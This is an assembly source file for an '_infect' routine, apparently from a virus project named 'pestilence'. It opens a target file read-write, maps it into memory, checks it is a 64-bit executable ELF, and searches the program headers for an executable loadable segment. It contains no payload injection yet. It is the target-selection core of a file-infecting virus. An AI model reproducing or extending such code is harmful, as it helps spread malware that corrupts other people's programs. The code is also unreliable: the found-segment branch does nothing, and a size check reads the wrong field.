%define INFECT_S

section .text
	global	_infect
	%include "pestilence.lst"

_newline:
	.string db 10, 0
	.length equ $ - _newline.string

_debug:
	.string db ':::breakpoint:::', 10, 0
	.length equ $ - _debug.string

;; -----------------------------------------------------------------------------------
;; NAME
;;		_infect
;;
;; SYNOPSIS
;;		void	_infect(void)
;;
;; DESCRIPTION
;;		This function reads from the upper stack the full path of the file to infect.
;;		It looks for valid ELF x86_64 files only.
;;
;; STACK USAGE
;;		rsp 		: fd
;;		rsp + 8		: file size
;;		rsp + 16	: mmap pointer
;;		rsp + 24	: segment headers offset
;;		rsp + 32	: segment headers number
;; -----------------------------------------------------------------------------------
_infect:
	enter	48, 0

	lea		rdi, [rbp + 24]
	call	_ft_strlen

	mov		rdx, rax
	mov		rax, 1
	mov		rdi, 1
	lea		rsi, [rbp + 24]
	syscall

	mov		rax, 1
	mov		rdi, 1
	lea		rsi, [rel _newline.string]
	mov		rdx, _newline.length
	syscall

_open_file:
	;; Open file
	mov		rax, sys_open
	lea		rdi, [rbp + 24]
	mov		rsi, 2
	mov		rdx, 0
	syscall

	;; Check if file descriptor is valid
	cmp		rax, -1
	jle		_infect_end
	mov		qword [rsp], rax

	;; Get file size
	mov		rdi, qword [rsp]
	call	_file_size

	;; Check if file size is valid
	cmp		rax, 0
	je		_close_file
	mov		qword [rsp + 8], rax

_mmap_file:
	;; Mmap file
	mov		rax, sys_mmap
	mov		rdi, 0
	mov		rsi, qword [rsp + 8]
	mov		rdx, 3
	mov		r10, 2
	mov		r8, qword [rsp]
	mov		r9, 0
	syscall

	;; Check if mmaping is valid
	cmp		rax, 0
	jle		_close_file
	mov		qword [rsp + 16], rax

;; -----------------------------------------------------------------------------------
;;	typedef struct {
;;		unsigned char e_ident[16];			0
;;		uint16_t      e_type;				16
;;		uint16_t      e_machine;			18
;;		uint32_t      e_version;			20
;;		Elf64_Addr    e_entry;				24
;;		Elf64_Off     e_phoff;				32
;;		Elf64_Off     e_shoff;				40
;;		uint32_t      e_flags;				48
;;		uint16_t      e_ehsize;				52
;;		uint16_t      e_phentsize;			54
;;		uint16_t      e_phnum;				56
;;		uint16_t      e_shentsize;			58
;;		uint16_t      e_shnum;				60
;;		uint16_t      e_shstrndx;			62
;;	} ElfN_Ehdr;							64
;; -----------------------------------------------------------------------------------
_read_elf_ehdr:
	;; If file size is lower than 64 bytes we don't have a valid ELF64 header
	cmp		qword [rsp + 8], 64
	jl		_munmap_file

	mov		rdi, qword [rsp + 16]
	
	;; If ELF magic number is not 0x464c457f
	cmp		dword [rdi], ELFMAGIC
	jne		_munmap_file

	;; If ELFCLASS is not ELFCLASS64
	add		rdi, 4
	cmp		byte [rdi], ELFCLASS64
	jne		_munmap_file

	;; If ELF type is not ET_EXEC
	mov		rdi, qword [rsp + 16]
	add		rdi, 16
	cmp		word [rdi], ET_EXEC
	jne		_munmap_file

	;; Get ehdr->e_phoff
	mov		rdi, qword [rsp + 16]
	add		rdi, 32
	mov		rdi, qword [rdi]
	mov		qword [rsp + 24], rdi

	;; Get ehdr->e_phnum
	mov		rdi, qword [rsp + 16]
	add		rdi, 56
	mov		di, word [rdi]
	mov		word [rsp + 32], di

;; -----------------------------------------------------------------------------------
;;	typedef struct {
;;		uint32_t   p_type;		0
;;		uint32_t   p_flags;		4
;;		Elf64_Off  p_offset;	8
;;		Elf64_Addr p_vaddr;		16
;;		Elf64_Addr p_paddr;		24
;;		uint64_t   p_filesz;	32
;;		uint64_t   p_memsz;		40
;;		uint64_t   p_align;		48
;;	} Elf64_Phdr;				56
;; -----------------------------------------------------------------------------------

;; We loop on each program header
_read_elf_phdr:
	;; Check if program headers don't exceed file size
	xor		rcx, rcx				; clear %rcx
	mov		cx, word [rsp + 24]		; %rcx = Elf64_Ehdr->e_phnum
	imul	rcx, 56					; %rcx *= 56
	mov		r10, qword [rsp + 24]	; %r10 = Elf64_Ehdr->e_phoff
	add		r10, rcx				; %r10 += %rcx
	cmp		r10, qword [rsp + 8]	; if (%r10 > file_size)
	jg		_munmap_file			; exit

	;; Get a pointer on the first Elf64_Phdr
	mov		r10, qword [rsp + 16]	; %r10 = *mmap
	add		r10, qword [rsp + 24]	; %r10 += Elf64_Phdr->e_phoff

	;; Get the number of program headers
	xor		rcx, rcx
	mov		cx, word [rsp + 32]

;; We are looking for the PT_LOAD segment with execution permission
_read_elf_phdr_loop:
	cmp		rcx, 0
	je		_munmap_file

	mov		rdi, r10
	cmp		dword [rdi], PT_LOAD
	jne		_read_elf_phdr_next

	mov		eax, dword [rdi + 4]
	and		eax, PF_X
	cmp		eax, 0
	je		_read_elf_phdr_next

_read_elf_phdr_next:
	add		r10, 56
	dec		rcx
	jmp		_read_elf_phdr_loop

_munmap_file:
	;; Munmap file
	mov		rax, sys_munmap
	mov		rdi, qword [rsp + 16]
	mov		rsi, qword [rsp + 8]
	syscall

_close_file:
	;; Close file
	mov		rax, sys_close
	mov		rdi, qword [rsp]
	syscall

_infect_end:
	;; Return
	leave
	ret

%undef INFECT_S
